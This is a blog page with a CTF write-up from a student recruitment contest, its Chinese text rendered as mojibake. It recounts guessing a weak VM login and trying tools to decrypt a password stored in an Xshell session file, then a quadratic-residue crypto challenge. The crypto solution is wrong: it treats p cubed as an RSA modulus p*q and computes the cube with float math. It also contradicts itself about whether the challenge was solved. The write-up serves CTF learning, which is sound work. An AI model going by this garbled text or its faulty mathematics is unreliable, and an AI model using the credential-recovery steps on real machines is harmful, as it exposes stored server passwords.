<p>æ–°å»ºè™šæ‹Ÿæœº<img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180835810.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101180927920.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>hint</p>
<p>å¼±å£ä»¤</p>
<p>å¯¹ç€ä¸€ä¸ªä¸€ä¸ªè¯•</p>
<p>password</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182024195.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101181249352.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ç™»å…¥æˆåŠŸ</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101182121236.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>æ‰“å¼€åçœ‹åˆ°xshell</p>
<p>ç”¨æˆ·åroot</p>
<p>å¯†ç </p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101184010183.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>é‚£è¿™ä¸ªæ¡Œé¢æ˜æ™ƒæ™ƒçš„ä¸€ä¸ªxshell</p>
<p>è‚¯å®šå¾—çœ‹è¿™ä¸ª</p>
<p>å®¡é˜…æ–‡ä»¶å¤¹</p>
<p>æˆ‘ä¸€å¼€å§‹ä¸å¤ªäº†è§£xshell æƒ³ç€æ˜¯çœ‹çœ‹æœ‰ä»€ä¹ˆ</p>
<p>æŸ¥æŸ¥çœ‹ è¿™æ–¹é¢</p>
<p>å®ƒå¯èƒ½å­˜åœ¨å“ªäº›å–è¯æ–¹å‘</p>
<p>2024/1/1 18:34:16</p>
<p>Xshellä½œä¸ºä¸€æ¬¾ç»ˆç«¯æ¨¡æ‹Ÿè½¯ä»¶ï¼Œå¯èƒ½å­˜åœ¨ä»¥ä¸‹å–è¯æ–¹å‘ï¼š</p>
<ol>
<li>ç™»å½•æ—¥å¿—ï¼šXshellä¼šè®°å½•ç”¨æˆ·ç™»å½•çš„æ—¶é—´ã€IPåœ°å€ã€ç”¨æˆ·åç­‰ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡åˆ†æç™»å½•æ—¥å¿—æ¥ç¡®å®šç”¨æˆ·çš„æ´»åŠ¨è½¨è¿¹ã€‚</li>
<li>å‘½ä»¤å†å²ï¼šXshellä¼šä¿å­˜ç”¨æˆ·åœ¨è¿œç¨‹æœåŠ¡å™¨ä¸Šæ‰§è¡Œçš„å‘½ä»¤å†å²è®°å½•ï¼Œå¯ä»¥é€šè¿‡åˆ†æå‘½ä»¤å†å²æ¥è¿˜åŸç”¨æˆ·çš„æ“ä½œè¿‡ç¨‹ã€‚</li>
<li>æ–‡ä»¶ä¼ è¾“ï¼šXshellæ”¯æŒæ–‡ä»¶ä¼ è¾“åŠŸèƒ½ï¼Œå¯ä»¥å°†æœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°è¿œç¨‹æœåŠ¡å™¨æˆ–ä»è¿œç¨‹æœåŠ¡å™¨ä¸‹è½½æ–‡ä»¶ã€‚å¯ä»¥é€šè¿‡åˆ†æä¼ è¾“æ—¥å¿—å’Œç›¸å…³æ–‡ä»¶æ¥ç¡®å®šæ–‡ä»¶çš„æ¥æºå’Œå»å‘ã€‚</li>
<li>åŠ å¯†åè®®ï¼šXshellä½¿ç”¨SSHåè®®è¿›è¡Œé€šä¿¡ï¼Œå¹¶æ”¯æŒRSA/DSAå…¬é’¥éªŒè¯ï¼Œå¯ä»¥é€šè¿‡è§£å¯†å’Œåˆ†æåŠ å¯†æ•°æ®åŒ…æ¥è¿˜åŸé€šä¿¡å†…å®¹ã€‚</li>
<li>å®‰å…¨è®¾ç½®ï¼šXshellæä¾›äº†ä¸€äº›ç½‘ç»œå®‰å…¨åŠŸèƒ½ï¼Œå¦‚ç«¯å£è½¬å‘ã€X11è½¬å‘ç­‰ï¼Œå¯ä»¥é€šè¿‡åˆ†æå®‰å…¨è®¾ç½®æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦æœ‰æ„å›¾ç»•è¿‡å®‰å…¨é™åˆ¶æˆ–è¿›è¡Œéæ³•æ“ä½œã€‚</li>
</ol>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿›è¡Œå–è¯æ´»åŠ¨æ—¶åº”éµå®ˆç›¸å…³æ³•å¾‹æ³•è§„ï¼Œå¹¶è·å–åˆæ³•çš„æˆæƒã€‚</p>
<p>ç„¶åæŸ¥æ—¥å¿—ä»€ä¹ˆéƒ½æ²¡æœ‰æŸ¥åˆ°</p>
<p>åæ¥äº†è§£åˆ°sessionsä¸­æœ‰å¾ˆå¤šå‚æ•°ï¼Œè¿æ¥æœåŠ¡å™¨çš„å¯†ç ï¼ŒSIDï¼Œç­‰ç­‰éƒ½åœ¨å…¶ä¸­ï¼Œå°±æ‰“å¼€è¿›è¡ŒæŸ¥çœ‹</p>
<p>æ‰¾åˆ°password</p>
<p>hEmTIaYScRHT3tDqLgQnh6hlr6mbKatbTmg2a1+InOc7jyOTVUwbbZEKBIxVIXk98I1Nor4RAVzQjEuxZVI=</p>
<p>å…ˆå¼€å§‹è®¤ä¸ºç¬¦åˆbase64ç‰¹å¾</p>
<p>è¿›è¡Œè§£å¯†</p>
<p>å¤±è´¥</p>
<p>åæ¥å‘å‡ºé¢˜äººè¯´æ˜äº†æˆ‘çš„è¿›å±•</p>
<p>å¾—çŸ¥hint&quot;å·¥å…·&quot;</p>
<p>Xshell å·¥å…·</p>
<p>å…³è”è¯æ˜¯Xshellè§£å¯†å·¥å…·</p>
<p>å¾çˆ±è®ºå›:</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/forum.php?mod=redirect&amp;goto=findpost&amp;pid=27789653&amp;ptid=1022040">akinet å‘è¡¨äº 2019-9-10 17:01</a><br>
ä»€ä¹ˆåŸç†ï¼Ÿå¾ªç¯æ‰¾å¯†ç ä¹ˆ</p>
</blockquote>
<p>ä¸æ˜¯ï¼Œæ˜¯æ ¹æ®åŠ å¯†ç®—æ³•é€†å‘è§£å¯†ï¼Œç±»ä¼¼çš„å·¥å…·è¿˜æœ‰<br>
éƒ½æ˜¯æˆ‘å·¥ä½œä¸­å¶å°”ç”¨åˆ°çš„</p>
<p>éšåæˆ‘ä¸‹è½½äº†ä»¥ä¸‹ä¸‰ä¸ªç½‘ä¸Šæµä¼ çš„å·¥å…·è¿›è¡Œè§£å¯†</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101202459405.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>ä½†å‘ç°å‡ä¸å®Œæ•´</p>
<p>é‡åˆ°ä¸€äº›é…ç½®é—®é¢˜ å¯¼è‡´è§£å¯†åŠŸäºä¸€ç¯‘</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101203131057.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>æ¯”èµ›æ—¶é—´æˆªæ­¢ æ¯”èµ›ç»“æŸ è§£é¢˜å¤±è´¥</p>
<h5 id="Crypto">Crypto</h5>
<h6 id="äºŒæ¬¡å‰©ä½™-æƒ³åˆ°å®Œæ•´æ€è·¯-æ²¡æ—¶é—´äº†">äºŒæ¬¡å‰©ä½™  æƒ³åˆ°å®Œæ•´æ€è·¯ æ²¡æ—¶é—´äº†</h6>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231231213502848.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>è¿™ä¸ªé¢˜æˆ‘å…¶å®æœ‰æ€è·¯</p>
<p>æˆ‘åœ¨åˆå­¦CTFçš„æ—¶å€™ç ”ç©¶è¿‡ä¸€æ®µæ—¶é—´å¯†ç å­¦ï¼Œå°¤å…¶æ˜¯RSA</p>
<p>è¿™ä¸ªé¢˜å°±æ˜¯RSAçš„å…¶ä¸­ä¸€éƒ¨åˆ†ï¼ŒæŠŠå®ƒå½“æˆRSAåšå°±è¡Œ</p>
<p>RSAæ¦‚è¦</p>
<ol>
<li>é€‰å–ä¸¤ä¸ªè¾ƒå¤§çš„äº’ä¸ç›¸ç­‰çš„è´¨æ•°på’Œqï¼Œè®¡ç®—<code>n = p * q</code> ã€‚</li>
<li>è®¡ç®—<code>phi = (p-1) * (q-1)</code> ã€‚</li>
<li>é€‰å–ä»»æ„eï¼Œä½¿å¾—eæ»¡è¶³ <code>1&lt;e&lt;phi</code> ä¸” <code>gcd(e , phi) == 1</code> ã€‚</li>
<li>è®¡ç®—eå…³äºphiçš„æ¨¡é€†å…ƒdï¼Œ å³dæ»¡è¶³<code>(e * d)% phi ==1</code> ã€‚</li>
<li>åŠ è§£å¯†ï¼š<code>c = (m ^ e) % n</code> ï¼Œ <code>m = (c ^ d) % n</code> ã€‚å…¶ä¸­mä¸ºæ˜æ–‡ï¼Œcä¸ºå¯†æ–‡ï¼Œ(n,e)ä¸ºå…¬é’¥å¯¹ï¼Œdä¸ºç§é’¥ï¼Œè¦æ±‚ <code>0 &lt;= m &lt; n</code> ã€‚</li>
</ol>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">a=(m ^ 2) % p<span class="hljs-strong">**3</span><br><span class="hljs-strong">m = (a ^ d) % p**</span>3<br><br>flag = <span class="hljs-emphasis">&#x27;CBCTF&#123;&#x27;</span> <span class="hljs-code">+ sha256(str(m).encode()).hexdigest() +</span> <span class="hljs-emphasis">&#x27;&#125;&#x27;</span><br><br>&#x27;&#x27;&#x27;<br>p = 334032027984155099402863982848235447227<br>a = 6363500121827697008224968006879792916113549541401919095721781619316319436679204160344656454420382763358609215987320<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure>
<p>æ ¸å¿ƒé—®é¢˜å°±æ˜¯æ±‚è§£mä¹ˆï¼Œé‚£æˆ‘pï¼ŒqçŸ¥é“äº†ï¼Œpow(a,b,c)å°±æ˜¯(a^b)mod c</p>
<p>a = pow(m,2,p**3)</p>
<p>å…¶å®æ„æ€å°±æ˜¯</p>
<p>a=(m ^ 2) % p**3</p>
<p>aï¼Œpå·²çŸ¥ï¼Œæƒ³æ±‚m</p>
<p>æ ¹æ®RSAç†è®ºï¼Œ</p>
<p>é€†è¿ç®—å°±æ˜¯</p>
<p>m = (a ^ d) % p**3</p>
<p>ç”¨pyå®ç°å°±æ˜¯m=pow(a,d,p**3)</p>
<p>è¿™æ ·å°±èƒ½æŠŠmæ±‚å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cube</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-keyword">return</span> math.<span class="hljs-built_in">pow</span>(n, <span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure>
<p>è¿™æ ·p^3å°±ç®—å‡ºæ¥äº†ï¼Œ</p>
<p>ç„¶åm = (a ^ d) % p**3</p>
<p>è¿˜ç¼ºç§é’¥d</p>
<p>ç§é’¥då¥½æ±‚</p>
<p>æŒ‰RSAçš„ç†è®ºï¼Œ,p**3=p  * q</p>
<p>å°±ä¸€ä¸ªæœªçŸ¥æ•°q</p>
<p>ä½ åè§£å®ƒå¾ˆå®¹æ˜“</p>
<p>è§£å‡ºpï¼Œqï¼Œè®¡ç®—<code>phi = (p-1) * (q-1)</code> ã€‚é€‰å–ä»»æ„eï¼Œä½¿å¾—eæ»¡è¶³ <code>1&lt;e&lt;phi</code> ä¸” <code>gcd(e , phi) == 1</code> ã€‚è®¡ç®—eå…³äºphiçš„æ¨¡é€†å…ƒdï¼Œ å³dæ»¡è¶³<code>(e * d)% phi ==1</code> ã€‚</p>
<p>è¿™ç›´æ¥ç”¨å·¥å…·ä¸€æŠŠæ¢­äº†</p>
<p>ç›´æ¥å°±å‡ºäº†</p>
<p><img src="C:%5CUsers%5Casus%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240101212200012.png" srcset="/img/loading.gif" lazyload alt=""></p>
<p>è¿™æ ·å°±è§£å‡ºæ¥äº†</p>
<p>æ¯”èµ›åˆ°1.1æ—¥ï¼Œæœ€åä¸¤ä¸ªå°æ—¶çš„æ—¶å€™ï¼Œç»è¿‡å¯¹åŸæ¥ä¹‹å‰å¯†ç å­¦çš„å¤ä¹ ï¼Œè¿™é¢˜æˆ‘æƒ³åˆ°æ€è·¯äº†ï¼Œä½†æ˜¯æˆ‘å½“æ—¶åœ¨åšMISCçš„ç£ç›˜å–è¯å¤§é¢˜ï¼Œå°±æ²¡æ¥å¾—åŠï¼Œå¾ˆå¯æƒœ</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/wp/" class="print-no-link">#wp</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>2023å¹´æœ«_0raysæ‹›æ–°èµ›</div>
      <div>https://s0k1y.github.io/2024/01/01/CBCTF/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>s0k1y</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2024å¹´1æœˆ1æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2024/03/13/HGAME-WEEK1/" title="HGAME_WEEK1">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">HGAME_WEEK1</span>
                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>




  
<script src="/js/flower.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
<script type="text/javascript" src="/js/click_show_text.js"></script>
<script type="text/javascript" src="\js\snow.js"></script>